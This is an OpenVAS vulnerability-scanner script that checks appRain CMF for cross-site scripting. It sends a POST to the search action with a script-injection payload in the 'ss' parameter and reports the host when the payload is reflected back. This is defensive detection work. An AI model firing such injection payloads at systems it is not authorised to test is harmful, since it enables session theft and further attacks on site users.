##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apprain_multiple_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# appRain CMF Multiple Cross-Site scripting Vulnerabilities.
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a user's browser session in the context of a vulnerable
  site. This may allow an attacker to steal cookie-based authentication
  credentials and launch further attacks.
  Impact Level: Application.";
tag_affected = "appRain CMF version 0.1.5-Beta (Core Edition) and prior.
  appRain CMF version 0.1.3 (Quick Start Edition) and prior.";

tag_insight = "Multiple flaws are due to an input passed via,
  - 'ss' parameter in 'search' action is not properly verified before it is
    returned to the user.
  - 'data[sconfig][site_title]' parameter in '/admin/config/general' action
    is not properly verified before it is returned to the user.";
tag_solution = "No solution or patch is available as of 14th July, 2011. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://code.google.com/p/apprain-quickstart/downloads/list";
tag_summary = "This host is running appRain CMF and is prone to cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(801954);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)");
  script_bugtraq_id(48623);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("appRain CMF Multiple Cross-Site scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=215");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SECPOD_AppRain_Multiple_XSS.txt");

  script_description(desc);
  script_summary("Confirm XSS vulnerability in appRain CMF");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP port
cmfPort = get_http_port(default:80);
if(!get_port_state(cmfPort)){
  exit(0);
}

foreach dir (make_list("/appRain", "/apprain", "/", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/index.php"), port:cmfPort);
  rcvRes = http_send_recv(port:cmfPort, data:sndReq);

  ## Confirm application
  if(">Lorem ipsum<" >< rcvRes && "Copy Right" >< rcvRes)
  {
    filename = string(dir + "/search");
    host = get_host_name();
    authVariables = "ss=</title><script>alert('OpenVAS-XSS-TEST')</script>";

    ## Construct post request
    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent:  appRain XSS test\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);

    rcvRes = http_keepalive_send_recv(port:cmfPort, data:sndReq);

    ## Check the Response
    if("<script>alert('OpenVAS-XSS-TEST')<" >< rcvRes)
    {
      security_warning(cmfPort);
      exit(0);
    }
  }
}
